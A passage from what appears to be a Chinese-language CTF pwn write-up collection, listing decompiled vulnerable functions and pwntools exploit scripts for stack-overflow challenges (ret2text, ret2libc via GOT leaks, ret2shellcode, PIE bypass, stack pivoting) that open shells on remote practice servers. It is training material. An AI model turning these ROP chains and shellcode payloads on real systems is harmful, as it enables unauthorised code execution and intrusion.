payload2=flat([b&#39;a&#39;*padding,write_plt,main_addr,1,write_got,4])
io.sendline(payload2)
write_addr = u32(io.recv(4))
print(&#34;write_addr is : &#34;&#43;hex(write_addr))
libc_base = write_addr-libc.symbols[&#39;write&#39;]
system_addr = libc_base &#43; libc.symbols[&#39;system&#39;]
binsh_addr = libc_base&#43;next(libc.search(b&#39;/bin/sh&#39;))
# print(hex(next(libc.search(b&#39;/bin/sh&#39;))))
# next() 返回迭代器的下一个项目
payload3 = flat([b&#39;a&#39;*padding,system_addr,exit_addr,binsh_addr])
# 返回地址不填exit_addr有可能会没有回显
io.sendline(payload1)
io.recv()
io.sendline(payload3)
io.interactive()
```

## get_started_3dsctf_2016(ret2text or ret2shellcode)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp&#43;4h] [ebp-38h] BYREF

  printf(&#34;Qual a palavrinha magica? &#34;, v4[0]);
  gets(v4);
  return 0;
}
```

```c
void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )
  {
    v2 = fopen(&#34;flag.txt&#34;, &#34;rt&#34;);
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
```

**exp**

ret2text

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 25543)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
getflag_addr=0x080489A0
padding = 0x38
exit_addr = 0x0804E6A0
# io.recv()
payload = flat([b&#39;a&#39; * padding, getflag_addr,exit_addr,814536271,425138641])
io.sendline(payload)
io.interactive()
```

ret2shellcode(还不是很熟练)

```c
from pwn import *
from LibcSearcher import *

io = remote(&#39;node3.buuoj.cn&#39;,28526)
elf = ELF(&#39;./get_started_3dsctf_2016&#39;)

bss=0x080eb000
pop_ebx_esi_edi_ret=0x080509a5

payload = &#39;A&#39; * 0x38 &#43; p32(elf.sym[&#39;mprotect&#39;]) &#43; p32(pop_ebx_esi_edi_ret) &#43; p32(bss) &#43; p32(0x2c) &#43; p32(7)
payload &#43;= p32(elf.sym[&#39;read&#39;]) &#43; p32(bss) &#43; p32(0) &#43; p32(bss) &#43; p32(0x2c)
io.sendline(payload)
payload=asm(shellcraft.sh())
io.sendline(payload)

io.interactive()
```

## jarvisoj_level2_x64（ret2sys&#43;ROPgadget）

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp&#43;0h] [rbp-80h] BYREF

  system(&#34;echo Input:&#34;);
  return read(0, buf, 0x200uLL);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 25171)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
pop_rdi_ret = 0x4006b3
system_addr = 0x4004C0
#要找sysrem函数plt的地址
# .plt:00000000004004C0 ; int system(const char *command)
# .plt:00000000004004C0 _system proc near                       ; CODE XREF: vulnerable_function&#43;D↓p
# .plt:00000000004004C0 ; main&#43;1E↓p
# .plt:00000000004004C0 FF 25 9A 05 20 00             jmp     cs:off_600A60
# .plt:00000000004004C0
# .plt:00000000004004C0 _system endp
binsh_addr = 0x600A90
io.recv()
padding = 0x80&#43;0x8
payload = flat([b&#39;a&#39; * padding, pop_rdi_ret,binsh_addr,system_addr])
io.sendline(payload)
io.interactive()
```

## jarvisoj-level2(ret2sys)

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF

  system(&#34;echo Input:&#34;);
  return read(0, buf, 0x100u);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;pwn2.jarvisoj.com&#39;, 9878)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()

system_addr = 0x8048320
binsh_addr = 0x804A024
io.recv()
padding = 0x88&#43;0x4
payload = flat([b&#39;a&#39; * padding,system_addr,0,binsh_addr])
io.sendline(payload)
io.interactive()
```

## jarvisoj-Tell Me Something(ret2text)(远程环境有问题)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp&#43;0h] [rbp-88h] BYREF
  write(1, &#34;Input your message:\n&#34;, 0x14uLL);
  read(0, &amp;v4, 0x100uLL);
  return write(1, &#34;I have received your message, Thank you!\n&#34;, 0x29uLL);
}
```

```c
int good_game()
{
  FILE *v0; // rbx
  int result; // eax
  char buf[9]; // [rsp&#43;Fh] [rbp-9h] BYREF

  v0 = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  while ( 1 )
  {
    result = fgetc(v0);
    buf[0] = result;
    if ( (_BYTE)result == 0xFF )
      break;
    write(1, buf, 1uLL);
  }
  return result;
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
io = remote(&#39;pwn.jarvisoj.com&#39;, 9876)

#以调试的模式运行程序
#gdb.attach(io)
#pause()

catflag_addr=0x400620
io.recv()
padding = 0x88&#43;0x8
payload = flat([b&#39;a&#39; * padding,catflag_addr])
io.sendline(payload)
io.interactive()
```

## jarvisoj-level0(ret2sys&#43;ROPgadget)

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp&#43;0h] [rbp-80h] BYREF
  return read(0, buf, 0x200uLL);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
io = remote(&#39;pwn2.jarvisoj.com&#39;, 9881)

pop_rdi_ret = 0x400663
system_addr = 0x400460
binsh_addr = 0x400684
io.recv()
padding = 0x80&#43;0x8
payload = flat([b&#39;a&#39; * padding,pop_rdi_ret,binsh_addr,system_addr])
io.sendline(payload)
io.interactive()
```

## jarvisoj-level3(ret2libc_x86_本地libc)

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF
  write(1, &#34;Input:\n&#34;, 7u);
  return read(0, buf, 0x100u);
}
```

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
libc = ELF(&#39;./libc-2.19.so&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;pwn2.jarvisoj.com&#39;,9879)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
main_addr = 0x08048484
# exit_addr = 0x08048558
write_plt=elf.plt[&#39;write&#39;]
write_got=elf.got[&#39;write&#39;]
print(hex(write_plt))
print(hex(write_got))

padding = 0x88&#43;0x4
payload=flat([b&#39;a&#39;*padding,write_plt,main_addr,1,write_got,4])
io.recv()
io.sendline(payload)
write_addr = u32(io.recv(4))
print(&#34;write_addr is : &#34;&#43;hex(write_addr))
libc_base = write_addr-libc.symbols[&#39;write&#39;]
#根据write()的真实地址计算出offset
system_addr = libc_base &#43; libc.symbols[&#39;system&#39;]
binsh_addr = libc_base&#43;next(libc.search(b&#39;/bin/sh&#39;))
io.recv()
payload3 = flat([b&#39;a&#39;*padding,system_addr,0,binsh_addr])
io.sendline(payload3)
io.interactive()
```

## jarvisoj-level4(ret2libc_x86)

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
main_addr = 0x8048470
# exit_addr = 0x08048558
write_plt=0x8048340
write_got=0x804A018

padding = 0x88&#43;0x4
payload=flat([b&#39;a&#39;*padding,write_plt,main_addr,1,write_got,4])
io.sendline(payload)
write_addr = u32(io.recv(4))

print(&#34;write_addr is : &#34;&#43;hex(write_addr))
libc = LibcSearcher(&#39;write&#39;,write_addr)
libc_base=write_addr-libc.dump(&#39;write&#39;)
system_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)
payload3 = flat([b&#39;a&#39;*padding,system_addr,0,binsh_addr])
io.sendline(payload3)
io.interactive()
```

## jarvisoj-level2(ret2sys_x64)

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./3&#39;
io = remote(&#39;pwn2.jarvisoj.com&#39;,9882)

#以调试的模式运行程序
#gdb.attach(io)
#pause()
pop_rdi_ret_addr = 0x00000000004006b3
system_addr = 0x00000000004004C0
binsh_addr = 0x0000000000600A90

padding = 0x80&#43;0x8
payload = flat([b&#39;a&#39;*padding,pop_rdi_ret_addr,binsh_addr,system_addr])
io.sendline(payload)
io.interactive()
```

## jarvisoj-level2(ret2libc_x64_本地libc)

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp&#43;0h] [rbp-80h] BYREF
  write(1, &#34;Input:\n&#34;, 7uLL);
  return read(0, buf, 0x200uLL);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
libc = ELF(&#39;./libc-2.19.so&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;pwn2.jarvisoj.com&#39;,9883)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_r15_ret_addr = 0x00000000004006b1
ret_addr = 0x0000000000400499
main_addr = 0x000000000040061A
write_plt=elf.plt[&#39;write&#39;]
write_got=elf.got[&#39;write&#39;]
padding = 0x80&#43;0x8
payload=flat([b&#39;a&#39;*padding,pop_rdi_ret_addr,1,pop_rsi_r15_ret_addr,write_got,8,write_plt,main_addr])
io.recv()
io.sendline(payload)
write_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
print(&#34;write_addr is : &#34;&#43;hex(write_addr))
libc_base = write_addr-libc.symbols[&#39;write&#39;]
#根据write()的真实地址计算出offset
system_addr = libc_base &#43; libc.symbols[&#39;system&#39;]
binsh_addr = libc_base&#43;next(libc.search(b&#39;/bin/sh&#39;))
io.recv()
payload3 = flat([b&#39;a&#39;*padding,pop_rdi_ret_addr,binsh_addr,system_addr])
io.sendline(payload3)
io.interactive()
```

## BUUOJ-[HarekazeCTF2019]baby_rop(ret2sys&#43;find flag)

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 26489)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
pop_rdi_ret_addr = 0x0000000000400683
system_addr = 0x000000000400490
binsh_addr = 0x00000000601048
padding = 0x10&#43;0x8
io.recv()
payload = flat([b&#39;a&#39; * padding, pop_rdi_ret_addr, binsh_addr, system_addr])
io.sendline(payload)
io.interactive()
```

Tips：这题的flag不在根目录，需要通过 find . -name &#39;flag&#39; 命令查找

```bash
./home/babyrop/flag
find: &#39;./proc/tty/driver&#39;: Permission denied
find: &#39;./proc/1/task/1/fd&#39;: Permission denied
find: &#39;./proc/1/task/1/fdinfo&#39;: Permission denied
find: &#39;./proc/1/task/1/ns&#39;: Permission denied
find: &#39;./proc/1/fd&#39;: Permission denied
find: &#39;./proc/1/map_files&#39;: Permission denied
find: &#39;./proc/1/fdinfo&#39;: Permission denied
find: &#39;./proc/1/ns&#39;: Permission denied
find: &#39;./proc/7/task/7/fd&#39;: Permission denied
find: &#39;./proc/7/task/7/fdinfo&#39;: Permission denied
find: &#39;./proc/7/task/7/ns&#39;: Permission denied
find: &#39;./proc/7/fd&#39;: Permission denied
find: &#39;./proc/7/map_files&#39;: Permission denied
find: &#39;./proc/7/fdinfo&#39;: Permission denied
find: &#39;./proc/7/ns&#39;: Permission denied
find: &#39;./root&#39;: Permission denied
```

## BUUOJ-not_the_same_3dsctf_2016(调用write函数来读取bss段内容_x86)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp&#43;Fh] [ebp-2Dh] BYREF
  printf(&#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &#34;);
  gets(v4);
  return 0;
}
```

```c
int get_secret()
{
  int v0; // esi
  v0 = fopen(&#34;flag.txt&#34;, &amp;unk_80CF91B);
  fgets(&amp;fl4g, 45, v0);
  return fclose(v0);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
io = remote(&#39;node4.buuoj.cn&#39;,29591)

writeflag_addr=0x080489A0
write_addr = 0x806E270
flagbss_addr = 0x080ECA2D
padding = 0x2D
payload=flat([b&#39;a&#39;*padding,writeflag_addr,write_addr,0,1,flagbss_addr,45])
#Tips:一定要记得填上write函数的返回地址
io.sendline(payload)
io.interactive()
```

## BUUOJ-ciscn_2019_n_5（ret2shellcode / ret2libc_x64）

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp&#43;0h] [rbp-20h] BYREF
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&#34;tell me your name&#34;);
  read(0, name, 0x64uLL);
  puts(&#34;wow~ nice name!&#34;);
  puts(&#34;What do you want to say to me?&#34;);
  gets(text);
  return 0;
}
```

**ret2shellcode**

这个方法可能有点慢，要稍微等一会。

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;,25898)

shellcode = asm(shellcraft.sh())
shellcode_addr = 0x601080
padding = 0x20&#43;0x8

io.recv()
io.sendline(shellcode)
io.recv()
payload = flat([b&#39;a&#39; * padding,shellcode_addr])
io.sendline(payload)
io.interactive()
```

**ret2libc**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./4&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;,25898)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
 
ret_addr=0x00000000004004c9
pop_rdi_ret_addr=0x0000000000400713
puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x0000000400636

padding = 0x20&#43;0x8

payload = flat([b&#39;a&#39; * (padding),pop_rdi_ret_addr,puts_got,puts_plt,main_addr])
io.recv()
io.sendline(&#39;1&#39;)
io.recv()
io.sendline(payload)
puts_addr=u64(io.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))
libc=LibcSearcher(&#39;puts&#39;,puts_addr)
libc_base=puts_addr-libc.dump(&#39;puts&#39;)
sys_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)

payload1 =flat([b&#39;a&#39; *(padding),ret_addr,pop_rdi_ret_addr,binsh_addr,sys_addr])
io.recv()
io.sendline(&#39;1&#39;)
io.recv()
io.sendline(payload1)
io.interactive()
```

## BUUOJ-others_shellcode(ret2shellcode)

```c
int getShell()
{
  int result; // eax
  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF
  strcpy(v1, &#34;/bin//sh&#34;);
  result = 11;
  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

发现asm里面是int 0x80，启动中断，那么这时我们看看eax，eax就是result，这个赋值成了11

查一下表发现是execve函数，然后又发现栈上的参数赋值成了/bin//sh，直接nc就能拿到shell.

## BUUOJ-ciscn_2019_ne_5（布置栈&#43;函数调用）

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp&#43;0h] [ebp-100h] BYREF
  char src[4]; // [esp&#43;4h] [ebp-FCh] BYREF
  char v6[124]; // [esp&#43;8h] [ebp-F8h] BYREF
  char s1[4]; // [esp&#43;84h] [ebp-7Ch] BYREF
  char v8[96]; // [esp&#43;88h] [ebp-78h] BYREF
  int *p_argc; // [esp&#43;F4h] [ebp-Ch]

  p_argc = &amp;argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 48;
  memset(v6, 0, sizeof(v6));
  puts(&#34;Welcome to use LFS.&#34;);
  printf(&#34;Please input admin password:&#34;);
  __isoc99_scanf(&#34;%100s&#34;, s1);
  if ( strcmp(s1, &#34;administrator&#34;) )
  {
    puts(&#34;Password Error!&#34;);
    exit(0);
  }
  puts(&#34;Welcome!&#34;);
  puts(&#34;Input your operation:&#34;);
  puts(&#34;1.Add a log.&#34;);
  puts(&#34;2.Display all logs.&#34;);
  puts(&#34;3.Print all logs.&#34;);
  printf(&#34;0.Exit\n:&#34;);
  __isoc99_scanf(&#34;%d&#34;, &amp;v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog((int)src);
      break;
    case 2:
      Display(src);
      break;
    case 3:
      Print();
      break;
    case 4:
      GetFlag(src);
      break;
    default:
      break;
  }
  sub_804892B();
  return result;
}
```

```c
int __cdecl AddLog(int a1)
{
  printf(&#34;Please input new log info:&#34;);
  return __isoc99_scanf(&#34;%128s&#34;, a1);
}

int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp&#43;0h] [ebp-48h] BYREF
  char v3[60]; // [esp&#43;4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf(&#34;The flag is your log:%s\n&#34;, dest);
}
```

只能利用函数Addlog和GetFlag来getshell，Addlog允许输入128字节的内容，然后GetFlag函数会调用我们输入的src，并把src复制给dest。所以利用思路就是，我们先在Addlog里布栈，然后通过GetFlag函数会将src作为参数传入这一点来进行栈溢出ret到system函数来getshell。

```bash
#这里有个新技巧就是利用ROPgadget来查找字符串
ROPgadget --binary filename --string &#34;sh&#34;
#利用objdump来找system函数的地址
objdump -d 0 | grep system
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 27858)

system_addr = 0x080484D0
sh_addr = 0x080482ea
exit_addr = 0x080484E0
#Tips：尽量将返回地址填为exit_addr,要不然有时候会报错打不通
padding = 0x48&#43;0x4

io.recv()
io.sendline(&#34;administrator&#34;)
io.recv()
io.sendline(&#39;1&#39;)

payload = flat([b&#39;a&#39; * padding, system_addr,exit_addr,sh_addr])
io.sendline(payload)
io.recv()
io.sendline(&#39;4&#39;)
io.interactive()
```

## NSSCTF-[NISACTF 2022]ReorPwn?

```c
__int64 __fastcall fun(const char *a1)
{
  __int64 result; // rax
  char v2; // [rsp&#43;17h] [rbp-9h]
  int i; // [rsp&#43;18h] [rbp-8h]
  int v4; // [rsp&#43;1Ch] [rbp-4h]

  v4 = strlen(a1);
  for ( i = 0; ; &#43;&#43;i )
  {
    result = (unsigned int)(v4 / 2);
    if ( i &gt;= (int)result )
      break;
    v2 = a1[i];
    a1[i] = a1[v4 - i - 1];
    a1[v4 - i - 1] = v2;
  }
  return result;
}
```

字符串逆序，nc以后输入hs/nib/即可getshell

## NSSCTF-[NISACTF 2022]ezstack

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
# context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;, 28406)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x48&#43;0x4
system_addr = 0x08048390
binsh_addr = 0x0804A024
io.recv()
payload = flat([b&#39;a&#39;*padding,system_addr,0,binsh_addr])
io.sendline(payload)
io.interactive()
```

## NSSCTF-[NISACTF 2022]ezpie（PIE保护_x86）

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

PIE保护开启，函数的地址随机在变，但是每个函数间的偏移量不变

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  puts(&#34;OHHH!,give you a gift!&#34;);
  printf(&#34;%p\n&#34;, main);
  puts(&#34;Input:&#34;);
  vuln();
  return 0;
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
# context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;, 28080)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x28&#43;0x4
# calculate the offset between main and shell 
main_addr = elf.symbols[&#39;main&#39;]
shell_addr = elf.symbols[&#39;shell&#39;]
offset = shell_addr - main_addr
# print(&#39;offset is %x&#39; %offset)
io.recvuntil(&#39;gift!\n&#39;)
new_main_addr = int (io.recv(11),16)
#将接收到的16进制地址(包括\n和0x)转换为10进制
# print(new_main_addr)
new_shell_addr = new_main_addr&#43;offset
# print(new_shell_addr)
payload = flat([b&#39;a&#39;*padding,new_shell_addr])
io.recv()
io.sendline(payload)
io.interactive()
```

## [GFCTF 2021]where_is_shell(x64 用$0(\x24\x30来代替sh))

```bash
.text:0000000000400540 E8 24 30 00 00                call    near ptr 403569h
```

**exp：**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
# context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;, 28902)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10&#43;0x8
sys_addr = elf.plt[&#39;system&#39;]
print(sys_addr)
ret_addr = 0x0000000000400416
pop_rdi_ret_addr = 0x00000000004005e3
shell_addr = 0x400541
payload = flat([b&#39;a&#39;*padding,ret_addr,pop_rdi_ret_addr,shell_addr,sys_addr])
io.recv()
io.sendline(payload)
io.interactive()
```

## [Black Watch 入群题]PWN（栈迁移_x86 没打通）

```c
ssize_t vul_function()
{
  size_t v0; // eax
  size_t v1; // eax
  char buf[24]; // [esp&#43;0h] [ebp-18h] BYREF

  v0 = strlen(m1);
  write(1, m1, v0);
  read(0, &amp;s, 0x200u);
  v1 = strlen(m2);
  write(1, m2, v1);
  return read(0, buf, 0x20u);
}
```

**exp**

参考：https://blog.csdn.net/mcmuyanga/article/details/109260008

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
# context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 26060)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
main_addr = elf.symbols[&#39;main&#39;]
s = 0x0804A300
leave_ret_addr = 0x08048408
ret_addr = 0x08048312
padding = 0x18
payload = flat([write_plt,main_addr,1,write_got,4])
payload1 = flat([b&#39;a&#39;*padding,s-4,leave_ret_addr])
# 溢出后将rbp覆写成s-4的地址，函数返回地址覆写成leave；ret指令的地址
io.recv()
io.sendline(payload)
io.recv()
io.sendline(payload1)

write_addr = u32(io.recv(4))
print(hex(write_addr))
libc = LibcSearcher(&#39;write&#39;,write_addr)
libc_base = write_addr - libc.dump(&#39;write&#39;)
system_addr = libc_base &#43; libc.dump(&#39;system&#39;)
sh_addr = libc_base &#43; libc.dump(&#39;str_bin_sh&#39;)
payload2 = flat([system_addr,0,sh_addr])

io.recv()
io.sendline(payload2)
io.recv()
io.sendline(payload1)
io.interactive()
```

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
# context(log_level=&#39;INFO&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 26060)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
main_addr = elf.symbols[&#39;main&#39;]
s = 0x0804A300
leave_ret_addr = 0x08048408
ret_addr = 0x08048312
padding = 0x18
shellcode = asm(shellcraft.sh())
payload1 = flat([b&#39;a&#39;*padding,s-4,leave_ret_addr])
# 溢出后将rbp覆写成s-4的地址，函数返回地址覆写成leave；ret指令的地址
io.recv()
io.sendline(shellcode)
io.recv()
io.sendline(payload1)
io.interactive()
```

## 铁人三项(第五赛区)_2018_rop（retlibc_x86）

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import*
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
elf = ELF(pwnfile)
io = remote(&#39;node4.buuoj.cn&#39;,29199)

main_addr = elf.symbols[&#39;main&#39;]
# exit_addr = 0x08048558
write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]

padding = 0x88&#43;0x4
payload=flat([b&#39;a&#39;*padding,write_plt,main_addr,1,write_got,4])
io.sendline(payload)
write_addr = u32(io.recv(4))

print(&#34;write_addr is : &#34;&#43;hex(write_addr))
libc = LibcSearcher(&#39;write&#39;,write_addr)
libc_base=write_addr-libc.dump(&#39;write&#39;)
system_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)
payload3 = flat([b&#39;a&#39;*padding,system_addr,0,binsh_addr])
io.sendline(payload3)
io.interactive()
```

## pwnable_start(x86纯看汇编&#43;ret2shellcode)

这道题让我深刻领悟到了send和sendline的区别QAQ

